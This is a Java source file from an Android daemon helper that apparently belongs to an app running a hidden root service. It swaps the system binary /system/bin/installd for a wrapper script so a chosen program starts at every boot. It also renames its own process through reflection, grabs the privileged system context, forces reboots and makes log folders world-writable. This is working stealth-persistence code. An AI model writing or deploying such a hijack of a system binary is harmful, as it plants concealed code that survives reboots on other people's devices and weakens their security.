package com.fx.daemon;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Arrays;

import android.content.Context;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.PowerManager;

import com.fx.daemon.util.ContentChangeWaitingThread;
import com.fx.daemon.util.PhoneWaitingThread;
import com.fx.daemon.util.SyncWait;
import com.vvt.logger.FxLog;
import com.vvt.logger.Logger;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.CannotGetRootShellException.Reason;
import com.vvt.shell.Shell;

public class DaemonHelper {
	
	public static final String SYSTEM_LIB_PATH = "/system/lib";
	
	private static final String TAG = "DaemonHelper";
	private static boolean LOGV = Customization.VERBOSE;
	private static boolean LOGE = Customization.ERROR;
	
	private static final String INSTALLD_REAL_PATH = "/system/bin/installd";
	private static final String INSTALLD_BACKUP_PATH = "/system/bin/installd.o";
	
	public static final int DEFAULT_LOG_SIZE = 200000; // 200 KB
	
	/**
	 * To hook the selected daemon startup script to /system/bin/installd
	 * Note: Don't forget to remount /system as read-write before start the operation
	 * @param path
	 */
	public static void setupRebootHook(String startupScriptPath) 
			throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(TAG, "setupRebootHook # ENTER ... ");
		
		if (LOGV) FxLog.v(TAG, "setupRebootHook # Create reboot hook script");
		String rebootHookScript = createRebootHookScript(startupScriptPath);
		
		Shell rootShell = Shell.getRootShell();
		
		try {
			if (LOGV) FxLog.v(TAG, "setupRebootHook # Installing ...");
			
			// Rename installd to installd.o
			rootShell.exec(String.format("mv %s %s", 
					INSTALLD_REAL_PATH, INSTALLD_BACKUP_PATH));
			
			// Check renamed file
			String result = rootShell.exec("/system/bin/ls " + INSTALLD_BACKUP_PATH);
			boolean isRenameCompleted = result != null && result.contains("installd.o");
			
			if (! isRenameCompleted) {
				throw new CannotGetRootShellException(Reason.SYSTEM_WRITE_FAILED);
			}
			
			// Write script into a file
			BufferedReader reader = new BufferedReader(new StringReader(rebootHookScript));
			String line = null;
			while ((line = reader.readLine()) != null) {
				rootShell.exec(String.format("echo \"%s\" >> %s", line, INSTALLD_REAL_PATH));
			}
			rootShell.exec(String.format("chown root.shell %s", INSTALLD_REAL_PATH));
			rootShell.exec(String.format("chmod 755 %s", INSTALLD_REAL_PATH));
			
			if (LOGV) FxLog.v(TAG, "setupRebootHook # Create rebook hook complete!");
		}
		finally {
			if (rootShell != null) rootShell.terminate();
		}
		
		if (LOGV) FxLog.v(TAG, "setupRebootHook # EXIT ... ");
	}
	
	/**
	 * Note: Don't forget to remount /system as read-write before start the operation
	 * @throws CannotGetRootShellException
	 */
	public static void removeRebootHook() throws CannotGetRootShellException {
		if (LOGV) FxLog.v(TAG, "removeRebootHook # ENTER ... ");
		Shell rootShell = Shell.getRootShell();
		
		String line = rootShell.exec("/system/bin/ls " + INSTALLD_BACKUP_PATH);
		
		if (line != null && ! line.contains("No such file or directory")) {
			rootShell.exec(String.format("mv %s %s", 
					INSTALLD_BACKUP_PATH, INSTALLD_REAL_PATH));
		}
		
		rootShell.terminate();
		if (LOGV) FxLog.v(TAG, "removeRebootHook # EXIT ... ");
	}
	
	public static boolean isRebootHookInstalled(String rebootHookScript) 
			throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(TAG, "isRebootHookInstalled # ENTER ...");
		
		Shell rootShell = Shell.getRootShell();
		
		// ls /system/bin/installd.o
		String renamedFile = rootShell.exec(String.format("%s -l %s", 
				Shell.CMD_LS, INSTALLD_BACKUP_PATH));
		
		// ls -l /system/bin/installd
		String originalFile = rootShell.exec(String.format("%s -l %s", 
				Shell.CMD_LS, INSTALLD_REAL_PATH));
		
		// Content of installd
		String catResult = null;
		
		// Check content size of installd (a newly created one should not greater than 100B)
		if (!originalFile.contains(Shell.NO_SUCH_FILE)) {
			
			BufferedReader reader = new BufferedReader(new StringReader(originalFile));
			String line = null;
			
			while ((line = reader.readLine()) != null) {
				if (LOGV) FxLog.v(TAG, String.format("line: %s", line));
				if (line.contains("installd")) {
					if (LOGV) FxLog.v(TAG, "spliting ...");
					String[] info = line.split("\\s+");
					if (LOGV) FxLog.v(TAG, String.format("info: %s", Arrays.toString(info)));
					
					if (info != null && info.length > 3) {
						String fileSize = info[3];
						if (LOGV) FxLog.v(TAG, String.format("fileSize: %s", fileSize));
						
						if (fileSize.length() < 3) {
							// DON'T cat /system/bin/installd if installd.o was not created
							catResult = rootShell.exec(String.format(
									"cat %s",  INSTALLD_REAL_PATH));
							break;
						}
					}
				}
			}
		}
		
		rootShell.terminate();
		
		boolean isRebootHookInstalled = false;
		
		if (catResult != null) {
			String reformScript = rebootHookScript.replaceAll("[^\\w]","");
			if (LOGV) FxLog.v(TAG, String.format("reformScript: %s", reformScript));
			
			String reformCatResult = catResult.replaceAll("[^\\w]","");
			if (LOGV) FxLog.v(TAG, String.format("reformCatResult: %s", reformCatResult));
			
			isRebootHookInstalled = 
				!renamedFile.contains(Shell.NO_SUCH_FILE) && 
				reformCatResult.contains(reformScript);
		}
		
		if (LOGV) FxLog.v(TAG, String.format("isRebootHookInstalled: %s", isRebootHookInstalled));
		
		if (LOGV) FxLog.v(TAG, "isRebootHookInstalled # EXIT ...");
		
		return isRebootHookInstalled;
	}
	
	private static String createRebootHookScript(String startupScriptPath) {
		if (LOGV) FxLog.v(TAG, "createRebootHookScript # ENTER ... ");
		
		String result = null;
		
		StringBuilder script = new StringBuilder();
		script.append("#!/system/bin/sh\n");
		script.append(String.format("%s &\n", startupScriptPath));
		script.append(String.format("%s \\$*\n", INSTALLD_BACKUP_PATH));
		
		result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Reboot Hook Script:-\n%s", result));
		
		if (LOGV) FxLog.v(TAG, "createRebootHookScript # EXIT ... ");
		return result;
	}
	
	public static void createDirectory(String dirPath) throws CannotGetRootShellException {
		String[] paths = dirPath.split("/");
	
		String path = null;
		String creatingPath = null;
		
		Shell rootShell = Shell.getRootShell();
	
		for (int i = 0; i < paths.length; i++) {
			creatingPath = dirPath.startsWith("/") ? "/" : "";
			path = paths[i];
	
			if (path != null && path.length() > 0) {
				for (int j = 0; j <= i; j++) {
					if (paths[j] != null && paths[j].length() > 0) {
						creatingPath += String.format("%s/", paths[j]);
					}
				}
				rootShell.exec(String.format("mkdir %s", creatingPath));
			}
		}
	
		rootShell.terminate();
	}
	
	/**
	 * Copy asset to destination path
	 * @param context
	 * @param assetFileName
	 * @param destinationPath (exclude file name)
	 * @throws CannotGetRootShellException
	 * @throws IOException
	 */
	public static void extractAsset(
			Context context, String assetFileName, String destinationPath) 
					throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(TAG, "extractAsset # ENTER ...");

		File extracted = new File(context.getCacheDir(), "foo");
		StringBuilder destFullPath = new StringBuilder();

		destFullPath.append(destinationPath);
		if (!destinationPath.endsWith("/")) {
			destFullPath.append("/");
		}
		destFullPath.append(assetFileName);
		
		// Check whether the asset is already extracted
		Shell rootShell = Shell.getRootShell();
		String result = rootShell.exec(String.format("%s %s", Shell.CMD_LS, destFullPath));
		rootShell.terminate();
		boolean isFileExisted = !result.contains(Shell.NO_SUCH_FILE);
		
		if (isFileExisted) {
			if (LOGV) FxLog.v(TAG, "extractAsset # File already existed!");
		}
		else {
			if (LOGV) FxLog.v(TAG, String.format(
					"extractAsset # Extracting \"%s\" to \"%s\"", 
					assetFileName, destFullPath));
			
			extractInternalFile(context, assetFileName, extracted, 666);
			
			rootShell = Shell.getRootShell();
			rootShell.exec(String.format("cat %s > %s", extracted.getAbsolutePath(), destFullPath));
			rootShell.exec(String.format("chmod 644 %s", destFullPath));
			rootShell.terminate();
		}
		
		if (LOGV) FxLog.v(TAG, "extractAsset # EXIT ...");
	}
	
	/**
	 * Extracts a file from internal assets to the filesystem
	 * 
	 * @param ctx
	 *            the application's context
	 * @param internal
	 *            path to internal resource, relative to <code>assets</code>
	 * @param extracted
	 *            File to extract to
	 * @param mode
	 *            Unix-mode to set on the new file (chmod)
	 * @throws IOException
	 */
	private static void extractInternalFile(
			Context ctx, String internal, File extracted, int mode) throws IOException {

		if (LOGV) FxLog.v(TAG, "extractInternalFile # ENTER ...");
		AssetManager asset = ctx.getAssets();

		boolean done = false;
		File extracted_tmp;
		FileOutputStream os;
		extracted_tmp = new File(extracted.getParentFile(), "tmp"
				+ System.currentTimeMillis());
		try {
			os = new FileOutputStream(extracted_tmp);

			try {
				InputStream is = asset.open(internal);
				byte[] big_buffer = new byte[is.available()];
				if (is.read(big_buffer) != big_buffer.length) {
					throw new IOException("short read");
				}
				os.write(big_buffer);
			} catch (IOException e) {
				int i;
				for (i = 0;; i++) {
					try {
						InputStream is = asset.open(internal + "." + i);
						byte[] big_buffer = new byte[is.available()];
						if (is.read(big_buffer) != big_buffer.length) {
							throw new IOException("short read");
						}
						os.write(big_buffer);
					} catch (IOException e1) {
						break;
					}
				}

				if (i <= 0) {
					throw e;
				}
			}

			os.flush();
			os.close();

			try {
				String[] chmod = { "chmod",
						String.format("0%o", mode),
						extracted_tmp.getCanonicalPath() };
				Process p = Runtime.getRuntime().exec(chmod);
				while (true) {
					try {
						p.waitFor();
						break;
					} catch (InterruptedException e) {
						continue;
					}
				}

				if (extracted.exists()) {
					extracted.delete();
				}
				extracted_tmp.renameTo(extracted);
				done = true;
			} catch (IOException e) {
				extracted.delete();
				throw e;
			}
		} finally {
			if (!done && extracted_tmp.exists()) {
				extracted_tmp.delete();
			}
		}
		
		if (LOGV) FxLog.v(TAG, "extractInternalFile # EXIT ...");
	}
	
	public static void waitSystemReady() {
		if (LOGV) FxLog.v(TAG, "waitSystemReady # ENTER ...");
		
		SyncWait sync = new SyncWait();
		
		PhoneWaitingThread waitingThread = new PhoneWaitingThread(TAG, sync);
		waitingThread.start();
		
		sync.getReady();
		
		if (LOGV) FxLog.v(TAG, "waitSystemReady # EXIT ...");
	}

	public static void setProcessName(String processName) {
		// Actually we can call this method directly, however, to prevent compiling error on 
		// Eclipse, we call it via reflection. 
		// android.os.Process.setArgV0(processName);  
		try {
			Class<?> processClass = Class.forName("android.os.Process");
			Method setArgV0Method = processClass.getMethod("setArgV0", String.class);
			setArgV0Method.invoke(null, processName);
		} catch (ClassNotFoundException e) {
			throw new RuntimeException(e);
		} catch (SecurityException e) {
			throw new RuntimeException(e);
		} catch (NoSuchMethodException e) {
			throw new RuntimeException(e);
		} catch (IllegalArgumentException e) {
			throw new RuntimeException(e);
		} catch (IllegalAccessException e) {
			throw new RuntimeException(e);
		} catch (InvocationTargetException e) {
			throw new RuntimeException(e);
		}
	}
	
	public static void rebootDevice(Context context) {
		PowerManager power = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		
		try {
			if (LOGV) FxLog.v(TAG, "rebootDevice # Get class");
			Class<?> clsPowerManager = Class.forName("android.os.PowerManager");
			
			if (LOGV) FxLog.v(TAG, "rebootDevice # Get method");
			Method mtdReboot = clsPowerManager.getDeclaredMethod("reboot", new Class[] {String.class});
			mtdReboot.setAccessible(true);
			
			if (LOGV) FxLog.v(TAG, "rebootDevice # Invoke");
			mtdReboot.invoke(power, new Object[] {"N/A"});
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("rebootDevice # Error: %s", e.toString()));
		}
		
		try {
			Shell root = Shell.getRootShell();
			root.exec("restart");
			root.exec("reboot");
			root.terminate();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(TAG, String.format("rebootDevice # Error: %s", e.toString()));
		}
	}
    
    /**
     * Must be called under Looper.prepare()
     */
    public static Context getSystemContext() {
    	if (LOGV) FxLog.v(TAG, "getSystemContext # ENTER ...");
    	
    	Context context = null;
		
		try {
			if (LOGV) FxLog.v(TAG, "getSystemContext # Get class");
			Class<?> clsActivityThread = Class.forName("android.app.ActivityThread");
			
			if (LOGV) FxLog.v(TAG, "getSystemContext # Get method systemMain and enable accessible");
			Method mtdSysMain = clsActivityThread.getDeclaredMethod("systemMain", (Class[]) null);
			mtdSysMain.setAccessible(true);
			
			if (LOGV) FxLog.v(TAG, "getSystemContext # Invoke method");
			Object objActThread = mtdSysMain.invoke(null, (Object[]) null);
			
			if (LOGV) FxLog.v(TAG, "getSystemContext # Get field mSystemContext and enable accessible");
			Field member = clsActivityThread.getDeclaredField("mSystemContext");
			member.setAccessible(true);
			
			if (LOGV) FxLog.v(TAG, "getSystemContext # Get object of mSystemContext");
			context = (Context) member.get(objActThread);
		} 
		catch (Exception e) {
			if (LOGV) FxLog.e(TAG, String.format("getSystemContext # Error: %s", e.toString()));
		}
		
		if (LOGV) FxLog.v(TAG, "getSystemContext # EXIT ...");
		
		return context;
    }
    
    /**
     * Make folders and create log file with read-write permission.
     * The one who invoke this method should be able to obtain SU permission.
     * @param logFolder
     * @param logFilename
     */
    public static void initLog(String logFolder, String logFilename) {
    	if (LOGV) FxLog.v(TAG, "initLog # ENTER ...");
    	
    	File folder = new File(logFolder);
    	if (! folder.exists()) {
    		if (LOGV) FxLog.v(TAG, "initLog # Create a new folder");
    		try {
    			createDirectory(logFolder);
				Shell rootShell = Shell.getRootShell();
				rootShell.exec(String.format("chmod 777 %s", logFolder));
				rootShell.terminate();
			}
			catch (CannotGetRootShellException e) {
				if (LOGE) FxLog.e(TAG, String.format("initLog # Error: %s", e));
			}
    	}
    	
    	String filePath = String.format("%s/%s", logFolder, logFilename);
		
		File f = new File(filePath);
		if (! f.exists()) {
			if (LOGV) FxLog.v(TAG, "initLog # Create a new file");
			Shell shell = Shell.getShell();
			shell.exec(String.format("echo \"\" >> %s", filePath));
			shell.exec(String.format("chmod 666 %s", filePath));
			shell.terminate();
		}
		
		Logger.getInstance().SetLogPath(logFolder, logFilename);
		
		if (LOGV) FxLog.v(TAG, "initLog # EXIT ...");
	}
    
    public static void handleLogFileSize(long limitFileSize, String logPath, String logBakPath) {
		File f = new File(logPath);
		if (f.exists()) {
			long currentSize = f.length();
			if (currentSize > limitFileSize) {
				Shell shell = Shell.getShell();
				shell.exec(String.format("rm %s", logBakPath));
				shell.exec(String.format("mv %s %s", logPath, logBakPath));
				shell.exec(String.format("echo \"\" >> %s", logPath));
				shell.exec(String.format("chmod 666 %s", logPath));
				shell.terminate();
				FxLog.d(TAG, "handleLogFileSize # Log backup completed");
				FxLog.d(TAG, String.format(
						"handleLogFileSize # output=%s, size=%d", 
						logBakPath, currentSize));
			}
		}
	}
    
    public static void startProcessAndWait(
    		Daemon daemon, String tag, Uri startupSuccess, long timeout) {
    	
		if (LOGV) FxLog.v(TAG, "startProcessAndWait # ENTER ...");
		
		SyncWait syncWait = new SyncWait();
		
		ContentChangeWaitingThread waitingThread = 
				new ContentChangeWaitingThread(
						tag, syncWait, startupSuccess, timeout);
		
		waitingThread.start();
		
		try {
			if (LOGV) FxLog.v(TAG, String.format(
					"startProcessAndWait # Start process: %s", daemon.getProcessName()));
			daemon.startDaemon();
		}
		catch (RunningException e) {
			if (LOGE) FxLog.e(TAG, String.format("startProcessAndWait # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "startProcessAndWait # Wait until the process is ready");
		syncWait.getReady();
		
		if (LOGV) FxLog.v(TAG, "startProcessAndWait # EXIT ...");
    }
	
}
